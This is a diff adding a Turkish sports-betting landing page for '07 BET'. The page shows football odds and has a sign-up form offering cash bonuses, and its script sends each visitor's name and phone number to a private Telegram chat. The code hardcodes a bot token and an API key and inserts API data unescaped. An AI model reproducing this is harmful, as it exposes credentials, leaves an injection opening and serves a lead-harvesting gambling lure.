@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>07 BET | Profesyonel Panel</title>
+    <style>
+        :root { --gold: #ffcc00; --bg: #0b1622; --card: #15202b; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; }
+        
+        /* Modern Spor Kartı */
+        .match-card {
+            background: var(--card);
+            margin: 15px; border-radius: 15px; overflow: hidden;
+            border: 1px solid #2c3e50;
+        }
+        .match-img {
+            width: 100%; height: 120px; object-fit: cover;
+            background: #1e2732; /* Resim yüklenmezse boş kalmasın */
+        }
+        .match-info { padding: 15px; }
+        .odds-row { display: flex; gap: 10px; margin-top: 10px; }
+        .odd-btn { flex: 1; background: #1e2732; border: 1px solid var(--gold); color: var(--gold); padding: 10px; border-radius: 5px; text-align: center; }
+        
+        /* Kayıt Formu */
+        #registerOverlay {
+            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center;
+        }
+        .form-box { background: var(--card); width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; border: 2px solid var(--gold); }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
+        .submit-btn { width: 100%; padding: 15px; background: var(--gold); color: #000; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<header style="padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--gold);">
+    <div style="color: var(--gold); font-weight: bold; font-size: 24px;">07 BET</div>
+    <button onclick="document.getElementById('registerOverlay').style.display='flex'" style="background: #2ecc71; border:none; padding: 10px 20px; border-radius: 5px; font-weight: bold;">KAYIT OL</button>
+</header>
+
+<div id="matchContainer">
+    </div>
+
+<div id="registerOverlay">
+    <div class="form-box">
+        <h2 style="color: var(--gold); margin-top: 0;">HIZLI KAYIT</h2>
+        <input type="text" id="regName" placeholder="Ad Soyad">
+        <input type="tel" id="regTel" placeholder="Telefon (05xx)">
+        <select id="regBonus">
+            <option>5000 TL Bonus</option>
+            <option>200 TL Deneme Bonusu</option>
+        </select>
+        <button class="submit-btn" onclick="sendToTelegram()">ÜYE OL VE KAZAN</button>
+        <p onclick="document.getElementById('registerOverlay').style.display='none'" style="text-align: center; color: #666; cursor: pointer; margin-top: 15px;">Vazgeç</p>
+    </div>
+</div>
+
+<script>
+    // --- TELEGRAM AYARLARI ---
+    const BOT_TOKEN = "8334170490:AAEoym3kRcAdRGRjlNeXP8CvhanLAArzm9s";
+    const CHAT_ID = "52504489";
+
+    async function sendToTelegram() {
+        const name = document.getElementById('regName').value;
+        const tel = document.getElementById('regTel').value;
+        const bonus = document.getElementById('regBonus').value;
+
+        if(!name || !tel) { alert("Lütfen boş alan bırakmayın."); return; }
+
+        const text = `🚀 YENİ KAYIT\n👤 İsim: ${name}\n📞 Tel: ${tel}\n🎁 Bonus: ${bonus}`;
+        
+        // En sade Telegram API çağrısı (Parse Mode kapalı - Hata riskini sıfırlar)
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+        try {
+            const res = await fetch(url);
+            const data = await res.json();
+            if(data.ok) {
+                alert("Başarıyla alındı! Temsilcimiz sizi arayacak.");
+                location.reload();
+            } else {
+                alert("Telegram Hatası: " + data.description);
+            }
+        } catch (e) {
+            alert("Bağlantı hatası oluştu. Lütfen tekrar deneyin.");
+        }
+    }
+
+    async function loadMatches() {
+        try {
+            const res = await fetch('https://api.the-odds-api.com/v4/sports/soccer/odds/?apiKey=391055381f29a3f06b05c67516181c59&regions=eu');
+            const data = await res.json();
+            const container = document.getElementById('matchContainer');
+            
+            data.slice(0, 10).forEach((m, i) => {
+                const imgId = 10 + i; // Farklı resimler için
+                container.innerHTML += `
+                    <div class="match-card">
+                        <img src="https://images.unsplash.com/photo-1574629810360-7efbbe195018?q=80&w=400&sig=${imgId}" class="match-img">
+                        <div class="match-info">
+                            <div style="font-size: 12px; color: #888;">⚽ ${m.sport_title}</div>
+                            <div style="font-weight: bold; margin: 5px 0;">${m.home_team} vs ${m.away_team}</div>
+                            <div class="odds-row">
+                                <div class="odd-btn">1: ${m.bookmakers[0].markets[0].outcomes[0].price}</div>
+                                <div class="odd-btn">X: ${m.bookmakers[0].markets[0].outcomes[1].price}</div>
+                                <div class="odd-btn">2: ${m.bookmakers[0].markets[0].outcomes[2].price}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+        } catch(e) { console.error("API Hatası", e); }
+    }
+    loadMatches();
+</script>
+</body>
+</html>
